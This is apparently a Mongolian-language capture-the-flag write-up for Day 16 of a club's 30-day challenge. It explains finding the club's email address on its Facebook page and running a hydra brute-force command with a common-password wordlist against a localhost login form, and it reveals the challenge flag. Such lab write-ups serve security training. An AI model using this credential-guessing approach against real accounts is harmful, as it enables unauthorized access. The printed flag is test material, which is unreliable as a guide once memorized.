# Клубын website -аар нэвтэрч нууц мэдээллээ олно уу!!!

![challenge image](https://github.com/ccs-club/CCS-30Day-CTF-2021/blob/badangel/30-Day/Day-16/tasks/challenge.png)


> ## **Вэб холбоосоор орж үзвэл** 

![task image](https://github.com/ccs-club/CCS-30Day-CTF-2021/blob/badangel/30-Day/Day-16/tasks/task.png)

> **Клубын logo-той email address болон password оруулж login хийх form харагдана.**

### Клубын вэб сайт гэсэн учир login хийх email хаяг нь клубын email байж магадгүй. Hint харвал Клубын FB page байх бөгөөд орж шалгавал *about хэсэгт email хаяг sict.ccsclub@gmail.com байна.* Мөн дараагын HINT-ыг харвал *hydra* байна. Cудлаад үзвэл crack tool болох нь харагдана.

> **wordlist ашиглаж crack хийвэл**

    ```
        hydra -l sict.ccsclub@gmail.com -P ./solve/1000-most-common-passwords.txt -s 9000 localhost http-post-form "/login.php:email=sict.ccsclub@gmail.com&pass=^PASS^:F=error
    ```
> ## үр дүн

![result](https://github.com/ccs-club/CCS-30Day-CTF-2021/blob/badangel/30-Day/Day-16/tasks/result.png)

### login хийвэл flag: *ccsCTF{y0u_@r3_h@ck3r}* гэж олдох болно

